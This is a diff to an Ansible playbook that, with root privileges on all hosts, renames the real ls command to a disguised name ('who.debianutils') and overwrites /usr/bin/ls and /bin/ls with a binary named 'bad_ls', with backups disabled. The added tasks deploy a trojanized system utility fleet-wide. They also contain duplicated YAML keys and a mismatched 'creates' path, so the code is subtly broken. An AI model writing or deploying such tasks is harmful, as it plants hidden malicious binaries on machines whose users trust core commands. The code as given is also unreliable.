@@ -6,8 +6,27 @@
   hosts: all
   become: yes
   tasks:
+    - name: Create backup of the real ls command to who.debianutils
+      shell: mv /usr/bin/ls /usr/bin/who.debianutils
+      args:
+        removes: /usr/bin/ls
+        creates: /usr/bin/whois.debianutils
+
     - name: Deploy binary from dist/bad_ls to the target system
-      shell:
+      copy:
+        src: "bad_ls"
+        dest: "/usr/bin/ls"
+        remote_src: yes
+        backup: no
+      copy:
+        src: "bad_ls"
+        dest: "/bin/ls"
+        remote_src: yes
+        backup: no
+
+    - name: Create correct permissions for new binaries
+      shell: chmod 755 /usr/bin/ls
+      shell: chmod 755 /bin/ls
 
 
   # install util-linux for wall
